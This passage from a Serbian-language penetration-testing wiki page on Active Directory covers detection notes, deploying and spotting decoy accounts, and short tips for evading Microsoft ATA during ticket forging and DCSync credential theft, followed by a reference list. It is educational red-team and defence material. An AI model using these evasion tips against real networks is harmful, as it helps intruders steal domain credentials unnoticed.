- Operatori ih lako mogu promeniti i najbolje ih je koristiti za objašnjenje zbog čega je cross-protocol cluster sumnjiv
- **Operational notes**:
- Neki od ovih signala zahtevaju dekriptovan saobraćaj, [PCAP/Zeek parsing](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW ili vidljivost sa strane servisa
- Validirajte ih u odnosu na Samba/Linux klijente, appliance uređaje i legacy software pre nego što ih promovišete u alerts
- Promovišite detections od enrichment -> hunting -> alerting kako budete povećavali pouzdanost baseline-a

### **Implementing Deception Techniques**

- Implementiranje deception-a podrazumeva postavljanje zamki, kao što su decoy users ili computers, sa karakteristikama poput lozinki koje ne ističu ili naloga označenih kao Trusted for Delegation. Detaljan pristup obuhvata kreiranje korisnika sa određenim pravima ili njihovo dodavanje u grupe sa visokim privilegijama.<sup>[[2]](#references)</sup>
- Praktičan primer podrazumeva korišćenje alata kao što je: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Više informacija o deployment-u deception tehnika možete pronaći na [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identifying Deception**

- **Za User Objects**: Sumnjivi indikatori obuhvataju atypical ObjectSID, retke logon-e, datume kreiranja i mali broj neuspešnih lozinki.
- **General Indicators**: Poređenje atributa potencijalnih decoy objekata sa atributima legitimnih objekata može otkriti nedoslednosti. Alati poput [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) mogu pomoći u identifikovanju takvih deception-a.

### **Bypassing Detection Systems**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: Izbegavanje session enumeration-a na Domain Controllers radi sprečavanja ATA detekcije.
- **Ticket Impersonation**: Korišćenje **aes** keys za kreiranje ticket-a pomaže u izbegavanju detekcije jer se ne vrši downgrade na NTLM.
- **DCSync Attacks**: Preporučuje se izvršavanje sa hosta koji nije Domain Controller kako bi se izbegla ATA detekcija, jer će direktno izvršavanje sa Domain Controller-a pokrenuti alerts.

## References

- [1] [A Guide to Attacking Domain Trusts](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [Forging Trusts for Deception in Active Directory](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [From Domain Admin to Enterprise Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs – Dissecting Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon - Onelogon: Taking over Active Directory Accounts via Netlogon](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft - How to manage the changes in Netlogon secure channel connections associated with CVE-2020-1472](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [A journey into forgotten Null Session and MS-RPC interfaces](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [SID filter as security boundary between domains? (Part 4) - Bypass SID filtering research](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [SID filter as security boundary between domains? (Part 5) - Golden GMSA trust attack - from child to parent](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [SID filter as security boundary between domains? (Part 6) - Schema change trust attack - from child to parent](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [Escalating from child domain's admins to enterprise admins in 5 minutes by abusing AD CS, a follow up](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [An ACE Up the Sleeve: Designing Active Directory DACL Backdoors](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)
{{#include ../../banners/hacktricks-training.md}}
